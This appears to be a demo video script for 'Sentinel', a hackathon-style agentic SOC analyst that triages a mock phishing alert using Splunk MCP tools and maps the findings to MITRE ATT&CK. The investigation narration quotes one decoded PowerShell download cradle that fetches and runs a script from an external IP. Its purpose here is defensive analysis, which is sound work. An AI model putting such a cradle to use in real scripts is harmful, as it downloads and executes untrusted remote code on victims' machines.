# Sentinel — Demo Video Script

**Target length:** ~3 minutes  
**Scenario used:** `powershell_encoded_cmd` (most visually rich — 6 steps, phishing → C2 beaconing)  
**Mode:** mock (zero config, works offline)  
**Prize call-outs:** Best of Security · Best Use of MCP Server · Best Use of Hosted Models

---

## [0:00 – 0:20] Hook

> "Every SOC team I've talked to has the same problem: there are too many alerts and
> not enough Tier-1 analysts. Triaging a notable event — pulling correlated logs,
> enriching hosts and users, mapping findings to ATT&CK — takes 15–30 minutes of
> focused work. Multiply that by 200 alerts a day, and you're underwater before lunch.
>
> Sentinel is an agentic SOC analyst that does that work automatically, in seconds,
> using the Splunk MCP Server and Splunk's own Foundation-sec model."

---

## [0:20 – 0:45] Architecture in 20 seconds

*(Show `architecture-diagram.svg` on screen.)*

> "The design is straightforward. On the left: the Splunk MCP Server, which Sentinel
> calls for every tool — `splunk_search`, the AI Assistant tools, asset context,
> identity context. On the right: the LLM Client factory, which picks Foundation-sec
> if you've configured it, falls back to Claude, and falls back again to a fully
> offline Simulated Reasoning mode so the demo always works.
>
> In the middle: the TriageAgent — a ReAct loop that plans, acts, observes, and
> repeats until it has enough evidence to finalize a verdict. Everything it thinks
> and does is streamed live as a TraceEvent — to the terminal, or to this web
> dashboard over Server-Sent Events."

---

## [0:45 – 1:00] Start the demo

*(Switch to browser, `http://localhost:8000`.)*

> "Here's the web dashboard. On the left: three bundled scenarios — a PowerShell
> phishing incident, a brute-force credential access, and an after-hours data
> exfiltration. I'm going to click the first one."

*(Click `Encoded PowerShell Spawned by Office Document`.)*

> "The alert panel shows exactly what Splunk fired on: WINWORD.EXE spawned an
> obfuscated PowerShell command on host `hoth-fs01`, 90 seconds after the user opened
> an email attachment. Severity: high. Let's run the investigation."

*(Click **Run Investigation**.)*

---

## [1:00 – 2:00] Live investigation trace

*(Watch the trace panel stream in real time.)*

**Step 1 — splunk_search**

> "The agent's first thought: start by pulling EDR process-creation events around the
> alert time. It calls `splunk_search` — an MCP tool — and gets back two events:
> WINWORD.EXE opening `Q3_Vendor_Invoice.docm`, then immediately spawning PowerShell
> with `-EncodedCommand`. The observation emits three indicator tags:
> `office_spawned_shell`, `encoded_powershell`, `phishing_attachment`."

**Step 2 — saia_generate_spl**

> "Next: decode that base64 payload. The agent calls `saia_generate_spl` — the Splunk
> AI Assistant — which decodes the command and reveals a download cradle:
> `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/upd.ps1')`.
> Tag: `download_cradle`. The agent now knows this host reached out to an external IP."

**Step 3 — splunk_search**

> "It searches network logs for connections to that IP. 42 hits over 42 minutes,
> recurring every 60 seconds. Classic C2 beaconing. Tags: `c2_beaconing`,
> `suspicious_external_ip`."

**Step 4 — splunk_search**

> "DNS lookup history for that IP resolves to `cdn-update.net` — a 4-day-old domain
> already flagged by AlienVault OTX and abuse.ch. Tag: `newly_registered_domain`."

**Steps 5–6 — get_asset_context / get_identity_context**

> "Finally: asset context confirms `hoth-fs01` is a high-criticality Finance file
> server with SMB access for 40+ employees. Identity context shows the user opened the
> attachment from a spoofed vendor email two minutes before the alert."

---

## [2:00 – 2:30] Final report

*(Scroll to the Report panel.)*

> "The verdict: **TRUE POSITIVE / CRITICAL / 95% confidence**.
>
> The MITRE ATT&CK panel maps the evidence to 7 techniques — T1566.001 Spearphishing
> Attachment, T1059.001 PowerShell, T1027 Obfuscation, T1105 Ingress Tool Transfer,
> T1071.001 C2 Web Protocols, T1036.005 Masquerading — each linked directly to
> attack.mitre.org.
>
> And here's the recommended-actions checklist: isolate hoth-fs01 via EDR containment,
> block the C2 IP and domain, disable the user account, quarantine the malicious
> document fleet-wide, and open a critical IR ticket."

---

## [2:30 – 2:50] Prize call-outs

> "Three prize tracks, one project.
>
> **Best Use of MCP Server**: every evidence step goes through a real Splunk MCP tool.
> `splunk_search`, `saia_generate_spl`, `get_asset_context`, `get_identity_context` —
> all called over the official `mcp` SDK. Switching from this offline demo to a live
> Splunk instance is one environment variable: `SPLUNK_MODE=live`.
>
> **Best Use of Hosted Models**: when `FOUNDATION_SEC_BASE_URL` is set, every
> `decide_next_action` and `finalize_verdict` call goes to Foundation-sec — Splunk's
> security-tuned hosted model. It understands SPL, ATT&CK, and SOC terminology
> natively. No prompt engineering needed to get structured JSON back.
>
> **Best of Security**: this is real SOC automation. The agent doesn't just match
> rules — it reasons, gathers layered evidence, and produces a verdict and action
> plan with the specificity an IR team can actually execute."

---

## [2:50 – 3:00] Wrap-up

> "23 automated tests, three end-to-end scenarios, a full streaming web dashboard, and
> a CLI that saves Markdown reports — all running offline in under a second.
>
> Sentinel: because your analysts shouldn't spend their morning triaging alerts a
> machine could close in 10 seconds."

*(End screen: GitHub URL + 'python scripts/run_demo.py --all')*

---

## CLI demo (alternative / supplement)

If showing the CLI instead of or in addition to the web UI:

```bash
# List available scenarios
python scripts/run_demo.py --list

# Run one scenario with Rich formatting
python scripts/run_demo.py --scenario powershell_encoded_cmd

# Run all three and save Markdown reports
python scripts/run_demo.py --all --save-dir reports/
```

The terminal output shows each thought, tool call, and observation formatted with
Rich panels and color — green for observations, yellow for thoughts, cyan for tool
calls. The final verdict appears as a full-width panel with the MITRE table.

---

## Setup for a live run

If demonstrating with real Splunk:

```bash
cp .env.example .env
# Set SPLUNK_MODE=live, MCP_SERVER_COMMAND, SPLUNK_HOST, SPLUNK_PASSWORD
# Set FOUNDATION_SEC_BASE_URL + FOUNDATION_SEC_API_KEY for hosted model
python web/server.py
```

The agent connects to the Splunk MCP Server over stdio, runs real SPL searches, and
calls Foundation-sec for reasoning. The web UI is identical — the only change is
that events arrive from real infrastructure instead of the offline mock.
